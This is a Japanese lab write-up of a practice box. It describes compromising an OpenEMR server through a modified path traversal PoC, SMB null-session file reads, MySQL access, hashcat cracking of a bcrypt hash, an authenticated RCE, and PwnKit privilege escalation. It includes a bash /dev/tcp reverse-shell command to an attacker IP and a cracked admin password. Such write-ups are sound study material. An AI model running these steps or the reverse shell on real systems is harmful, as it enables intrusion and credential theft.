Tecrail RESPONSIVE filemanger の Path Traversal の脆弱性をエクスプロイトするPoCに軽微な変更を加え、OpenEMRというOSSからSQLの認証情報を抽出。
リモートでMySQLに接続し、OpenEMRの認証情報ハッシュをダンプし、クラック。
OpenEMRのRCE (Authenticated)の脆弱性を使い、Foothold を獲得。
Kernel Exploit である PwnKit を用いて権限昇格。

---

1. Port Scanをし、HTTPサービスとSamba、MySQLが動作していることを確認

2. Webにアクセスし、サイトを巡回していると、ユーザー名の候補やOpenEMRのログインフォームを発見

3. ディレクトリスキャンをし、Responsive Filemanager 9.13.4を発見し、Exploit-DBで検索したところ、Path Traversal ([49359 - Exploit-DB](https://www.exploit-db.com/exploits/49359))の脆弱性を発見し、これが対象サーバからファイルをコピーし、特定ディレクトリにファイルをペーストするPoCであることを分析
	- **反省**：
		- PoC に Verified マークがない、かつ、CVE が N/A になっていても、利用可能なケースがあるとは思わず、エクスプロイトを無視していた
		- Exploit-DB、GitHub以外にも、公式ベンダーが出している特定バージョンが影響を受ける脆弱性のペーパーも読むこと

4. SMB (Samba) を列挙すると、NULL セッションで READ 可能な Shareがあり、中身を確認すると、HTTP ディレクトリスキャンで発見した Documents というディレクトリに保存されているファイルと全く同じであったため、 Documents ディレクトリは HTTP と SMB 両方からアクセスできるものと推察

5. OpenEMR には データベースパスワードが保存されいてる PHP ファイルがあるが、RESPONSIVE filemanager の脆弱性は HTTP サービスにPHPファイルをペーストして中身を読み込むものであるため、OpenEMR の PHP ファイルをHTTP サービスにペーストしてからアクセスすると、PHP ファイルが実行され、中身が読み取れないことを確認

6. Documents ディレクトリが、HTTP と SMB 双方からアクセスできる物理ディレクトリであるため、[[Web Shell#Webアプリのソースコードを取得する考え方と手法概要]]に従い、Path Traversal ([49359 - Exploit-DB](https://www.exploit-db.com/exploits/49359)) の PoC で Documents にペーストするように修正
```python
# 修正前
...
def paste_clipboard(url, session_cookie):
	headers = {'Cookie': session_cookie,'Content-Type': 'application/x-www-form-urlencoded'}
	url_paste = "%s/filemanager/execute.php?action=paste_clipboard" % (url)
	r = requests.post(
	url_paste, data="path=", headers=headers)
	return r.status_code
...

# 修正後
	r = requests.post(
	url_paste, data="path=Documents/", headers=headers)
...
```

7. smbclient で接続し、 OpenEMR の PHP ファイルを読み取り、MySQL DB のパスワードを入手したので、接続し、OpenEMR のハッシュ値 を抽出 したのでクラック（サーバーがSSL非対応というエラーがあったため、`--skip-ssl`を付与）
```sh
$ mysql -u openemr -h $TargetIP -p --skip-ssl
```
![[Pasted image 20260214165811.png]]
```sh
$ echo -n '$2a$05$bJcIfCBjN5Fuh0K9qfoe0eRJqMdM49sWvuSGqv84VMMAkLgkK8XnC' > admin_hash.txt
$ hashcat admin_hash.txt -m 3200 -a 0 /usr/share/wordlists/rockyou.txt --force
```

8. OpenEMR のログインフォームからログインし、バージョン情報を特定のうえ、Exploit-DB で RCE Authenticated の PoC ([45161 - Exploit-DB](https://www.exploit-db.com/exploits/45161)) を発見したので、リバースシェルペイロードを実行
```sh
python2 openemr_rce.py http://192.168.155.145/openemr -u admin -p thedoctor -c 'bash -i >& /dev/tcp/192.168.45.182/443 0>&1'
```

9. www-data としてシェルを獲得したので、 LinPEAS を実行し、特に興味深い情報がないことを確認したので、 [[💥Linux Privilege Escalation#PwnKit (CVE-2021-4034)]]に従い、 `hostnamectl` を実行して、PwnKit に脆弱であることを確認のうえ実行し、 rootゲット

---

# 以下は怪しそうに見えたけど怪しくないものだった

Apache
```sh
root      1402  0.0  2.5 492324 26028 ?        Ss   00:04   0:00 /usr/sbin/apache2 -k start
www-data  1418  0.0  3.2 500904 33036 ?        S    00:04   0:00  _ /usr/sbin/apache2 -k start
```
- LinPEAS の結果で、 PHP の allow_url_fopen が ON になっていたので、LFI の脆弱性が頭をよぎり、上記が怪しく見えた
- しかし、Apacheは起動時のみrootが必要 で、その後はwww-dataによって動作することは当たり前のことだった


Cron
```sh
/etc/cron.d:
total 24
drwxr-xr-x   2 root root 4096 May 17  2021 .
drwxr-xr-x 102 root root 4096 May 27  2021 ..
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
-rw-r--r--   1 root root  589 Mar  7  2018 mdadm
-rw-r--r--   1 root root  712 Jan 17  2018 php
-rw-r--r--   1 root root  190 Nov  5  2020 popularity-contest
```
- `mdadm`：Linux において RAID を構成するソフトウェア